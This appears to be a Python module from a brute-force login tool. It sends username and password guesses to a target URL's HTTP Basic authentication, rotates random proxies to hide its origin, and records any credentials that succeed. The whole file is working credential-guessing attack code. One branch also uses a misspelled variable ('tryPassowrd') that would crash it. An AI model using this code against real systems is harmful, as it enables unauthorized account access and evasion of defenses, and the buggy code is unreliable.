from libs.mbrowser import Browser
import utils
from cores.actions import randomFromList

# https://stackoverflow.com/a/4089075

def submit(options, loginInfo, creds, result):
	tryPassword, tryUsername = creds

	realm, [fPassword, fUsername] = loginInfo
	if tryUsername in [x[1] for x in list(result.queue)]:
		return True
	
	try:
		proc = Browser()
		if options.proxy:
			proxyAddr = randomFromList(options.proxy)
			proc.setproxy(proxyAddr)
		else:
			proxyAddr = ""
		# proc.httpget_passwd(options.url, tryUsername, tryPassword, realm) # BUG
		resp = proc.get(options.url, auth=(tryUsername, tryPassword))
		if options.verbose:
			if options.proxy:
				utils.printf("[+] [%s=(%s); %s=(%s)] <--> %s" %(fUsername, tryUsername, fPassword, tryPassword, proxyAddr), 'norm')

		if resp.status_code == 401:
			if options.verbose:
				if options.proxy:
					utils.printf("[-] Failed [%s=(%s); %s=(%s)] <--> %s" %(fUsername, tryUsername, fPassword, tryPassword, proxyAddr), 'bad')
		elif resp.status_code == 403:
			utils.printf("[x] 403 forbidden: [%s:%s] %s" %(tryUsername, tryPassword, proxyAddr), "bad")
		elif resp.status_code == 404:
			utils.printf("[x] 404 not found: [%s:%s] %s" %(tryUsername, tryPassword, proxyAddr), "bad")
		elif resp.status_code >= 500:
			utils.printf("[x] %s Server error: [%s:%s] <--> %s" %(resp.status_code, tryUsername, tryPassowrd, proxyAddr))
		else:
			utils.printf("[*] Found: [%s:%s] [%s] --> %s" %(tryUsername, tryPassword, proc.get_title(), proxyAddr), "good")
			result.put([options.url, tryUsername, tryPassword])

	except Exception as err:
		utils.die("[x] HTTP GET:", err)